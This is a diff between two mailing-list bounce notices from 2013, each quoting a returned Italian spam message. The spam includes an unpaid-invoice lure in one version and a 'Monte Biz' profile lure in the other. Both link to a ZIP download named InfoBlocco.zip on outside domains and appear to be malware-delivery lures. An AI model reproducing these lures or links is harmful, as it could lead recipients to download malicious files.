@@ -1,9 +1,9 @@
-From: MAILER-DAEMON-xGejAJT2w6zaFNS7NbYSww@public.gmane.org (Mail Delivery System)
+From: MAILER-DAEMON-Cc/XG/tI2h8jO/d4LxdBO5Bk50Y0Ftjf@public.gmane.org (Mail Delivery System)
 Subject: Undelivered Mail Returned to Sender
-Date: Mon, 25 Mar 2013 11:20:24 +0100 (CET)
-Message-ID: <20130325102024.BDC64161B8@mailman.agef.it>
+Date: Mon, 25 Mar 2013 11:46:50 +0100 (CET)
+Message-ID: <20130325104650.3130310013BF@pecfe5.pec.lombardia.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1127808795929991639=="
+Content-Type: multipart/mixed; boundary="===============0705287989486496648=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -19,99 +19,100 @@ List-Id: containers.vger.kernel.org
 
 This is a MIME-encapsulated message.
 
---===============1127808795929991639==
+--===============0705287989486496648==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="93A611597A.1364206824/mailman.agef.it"
+	boundary="F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it"
 Content-Transfer-Encoding: 7bit
 
 This is a MIME-encapsulated message.
 
---93A611597A.1364206824/mailman.agef.it
+--F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
 Content-Description: Notification
 Content-Type: text/plain; charset=us-ascii
 
-This is the mail system at host mailman.agef.it.
+This is the mail system message.
 
 I'm sorry to have to inform you that your message could not
 be delivered to one or more recipients. It's attached below.
 
-For further assistance, please send mail to postmaster.
-
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
-
                    The mail system
 
-<a-chrisc-2hTUuzW2EsM@public.gmane.org>: host 192.168.116.2[192.168.116.2] said: 550 5.1.1 User
-    unknown (in reply to RCPT TO command)
+<ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: host
+    10.11.49.139[10.11.49.139] said: 550 5.1.1
+    <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: Recipient address
+    rejected: User unknown in virtual mailbox table (in reply to RCPT TO
+    command)
 
---93A611597A.1364206824/mailman.agef.it
+--F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
 Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; mailman.agef.it
-X-Postfix-Queue-ID: 93A611597A
+Reporting-MTA: dns; pecfe5.pec.lombardia.it
+X-Postfix-Queue-ID: F2B2F10013B9
 X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Mon, 25 Mar 2013 11:20:14 +0100 (CET)
+Arrival-Date: Mon, 25 Mar 2013 11:46:49 +0100 (CET)
 
-Final-Recipient: rfc822; a-chrisc-2hTUuzW2EsM@public.gmane.org
-Original-Recipient: rfc822;a-chrisc-2hTUuzW2EsM@public.gmane.org
+Final-Recipient: rfc822; ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
+Original-Recipient: rfc822;ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
 Action: failed
 Status: 5.1.1
-Remote-MTA: dns; 192.168.116.2
-Diagnostic-Code: smtp; 550 5.1.1 User unknown
+Remote-MTA: dns; 10.11.49.139
+Diagnostic-Code: smtp; 550 5.1.1
+    <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>: Recipient address
+    rejected: User unknown in virtual mailbox table
 
---93A611597A.1364206824/mailman.agef.it
+--F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it
 Content-Description: Undelivered Message
 Content-Type: message/rfc822
 Content-Transfer-Encoding: 7bit
 
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Greylist: delayed 00:09:53 by SQLgrey-1.8.0
-Received: from mail.efmnet.com (mail.efmnet.com [82.112.218.229])
-	by mailman.agef.it (Postfix) with ESMTP id 93A611597A
-	for <a-chrisc-2hTUuzW2EsM@public.gmane.org>; Mon, 25 Mar 2013 11:20:14 +0100 (CET)
-Received: from localhost (localhost [127.0.0.1])
-	by mail.efmnet.com (Postfix) with ESMTP id 560D1C88A8
-	for <a-chrisc-2hTUuzW2EsM@public.gmane.org>; Mon, 25 Mar 2013 11:24:08 +0100 (CET)
-X-Virus-Scanned: Debian amavisd-new at mail
-Received: from mail.efmnet.com ([127.0.0.1])
-	by localhost (mail.efmnet.com [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id g9rg0ypuJEpv for <a-chrisc-2hTUuzW2EsM@public.gmane.org>;
-	Mon, 25 Mar 2013 11:24:08 +0100 (CET)
-Received: from svr1.1800approved.com.au (unknown [27.50.89.175])
-	(Authenticated sender: ventura.carmela-tQCNxFLANi7QT0dZR+AlfA@public.gmane.org)
-	by mail.efmnet.com (Postfix) with ESMTPA id 28A0BC8C12
-	for <a-chrisc-2hTUuzW2EsM@public.gmane.org>; Mon, 25 Mar 2013 11:24:06 +0100 (CET)
-Received: from [27.50.89.175] by svr1.1800approved.com.au id YXyYTRGvmUUtKr; Mon, 25 Mar 2013 20:24:04 +1000
-Message-ID: <002601ce2942$dd6fe000$0200a8c0-yO7qbpGA2CrzHGSzgIKhZ5VmFPZ1e2FS@public.gmane.org>
-From: "Support" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <a-chrisc-2hTUuzW2EsM@public.gmane.org>
-Subject: variazioni nel conto
-Date: Mon, 25 Mar 2013 20:24:04 +1000
+Received: from localhost (pecfe5-mx [10.11.49.139])
+	by pecfe5.pec.lombardia.it (Postfix) with ESMTP id F2B2F10013B9
+	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>; Mon, 25 Mar 2013 11:46:49 +0100 (CET)
+X-VirusFound: false
+X-Spam: Score=3.728
+X-Virus-Scanned: amavisd-new at telecompost.it
+Received: from pecfe5.pec.lombardia.it ([127.0.0.1])
+	by localhost (pecfe5.telecompost.it [127.0.0.1]) (amavisd-new, port 10025)
+	with ESMTP id qFhiIItlt0kH
+	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>;
+	Mon, 25 Mar 2013 11:46:49 +0100 (CET)
+Received: from custompcs.net.au (unknown [27.50.89.71])
+	by pecfe5.pec.lombardia.it (Postfix) with ESMTP id 3FD721001307
+	for <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>; Mon, 25 Mar 2013 11:46:42 +0100 (CET)
+Received: from [27.50.89.71] by custompcs.net.au id WUiukZIbQIqh with SMTP; Mon, 25 Mar 2013 06:46:41 -0400
+Date: Mon, 25 Mar 2013 06:46:41 -0400
+From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.06.5) Personal
+X-Priority: 3 (Normal)
+Message-ID: <3128135263.85533408763050-tZDOFUKzIplqFZ3NbRY2NA@public.gmane.org>
+To: <ia.comune.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org>
+Subject: Re: Monte Biz.
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
 Content-Transfer-Encoding: quoted-printable
 
 
- =20
-Gentile utente,=20
-     =20
+
+Gentile utente, Monte Biz=20
+         =20
+  =20
+La risposta alla tua domanda riguardo al profilo sul nostro sito web.
+  =20
+Statistiche       =20
+http://www.journeynext.org/Notare/InfoBlocco.zip?yJUMokzBmpmLA=3Dia.comun=
+e.casnateconbernate-RwE6Ndc99cFLGcBWcxgnif9lYrnsuH/l@public.gmane.org
 
 
-Si prega di notare che hai una fattura non pagata.         =20
-   =20
-Dettagli: http://FIOREENATURA.COM.MX/Annullamento/InfoBlocco.zip?FQbLz4uX=
-3S1UjwGEQAYIM=3Da-chrisc-2hTUuzW2EsM@public.gmane.org
-
-      =20
+Id 829          .
 
 
 
---93A611597A.1364206824/mailman.agef.it--
+--F2B2F10013B9.1364208410/pecfe5.pec.lombardia.it--
 
---===============1127808795929991639==
+--===============0705287989486496648==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -121,4 +122,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============1127808795929991639==--
+--===============0705287989486496648==--
